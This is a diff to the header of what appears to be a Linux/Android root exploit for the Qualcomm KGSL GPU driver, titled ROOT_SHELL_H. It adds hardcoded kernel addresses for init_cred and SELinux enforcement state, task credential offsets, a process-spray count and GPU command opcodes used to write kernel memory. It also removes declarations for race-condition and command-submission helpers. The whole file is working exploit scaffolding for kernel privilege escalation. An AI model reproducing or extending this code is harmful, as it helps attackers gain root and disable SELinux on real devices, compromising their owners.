@@ -1,3 +1,4 @@
+
 #ifndef ROOT_SHELL_H
 #define ROOT_SHELL_H
 
@@ -19,11 +20,10 @@
 #include <linux/perf_event.h>
 #include <asm/unistd.h>
 #include <sys/wait.h>
+#include <signal.h>
 #include <sys/select.h>
 #include <poll.h>
 #include <sys/stat.h>
-#include <sys/socket.h>
-#include <dirent.h>
 
 #define KGSL_IOC_TYPE 0x09
 
@@ -83,35 +83,22 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
-#define FIXED_INIT_CRED      0xffffffee8817b738ULL
-#define FIXED_SELINUX_STATE  0xffffffee8833a000ULL
+#define VMLINUX_TEXT      0xffffffee85a81000ULL   /* _stext */
+#define VMLINUX_INIT_CRED 0xffffffee8817b738ULL   /* init_cred */
+#define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
+#define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
+
+#define CRED_OFF    0x740
+#define REAL_CRED_OFF 0x738
 
 #define SPRAY_PIDS 2000
 #define SCAN_DWORDS 560
-#define N_AVC_CHILD 10
 
 #define CP_NOP 0x10
 #define CP_MEM_WRITE 0x3D
 #define CP_MEM_TO_MEM 0x73
-
-extern int kgsl_fd;
-extern volatile int race_done;
-
-void die(const char *msg);
-void split64(uint64_t addr, uint32_t *lo, uint32_t *hi);
-uint32_t pm4_parity(uint32_t v);
-uint32_t cp_type7(uint32_t opcode, uint32_t cnt);
-int gpuobj_alloc(int fd, uint64_t size, uint64_t flags);
-void *gpuobj_mmap(int fd, size_t size, unsigned int id);
-int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags);
-void gpuobj_free(int fd, unsigned int id);
-unsigned int create_context(int fd);
-int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target);
-int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_ga, size_t bytes, unsigned int ib_id, unsigned int *out_ts);
-void *race_thread(void *arg);
-void flush_cpu_cache(void *start, size_t len);
-void gen_avc_entries(void);
-void dump_avc_page(uint64_t va, uint32_t *d, int n_slots);
-int main(int argc, char **argv);
+#define CP_WAIT_MEM_WRITES 0x12
+#define CP_EVENT_WRITE 0x46
+#define CACHE_FLUSH_TS 0x1C
 
 #endif
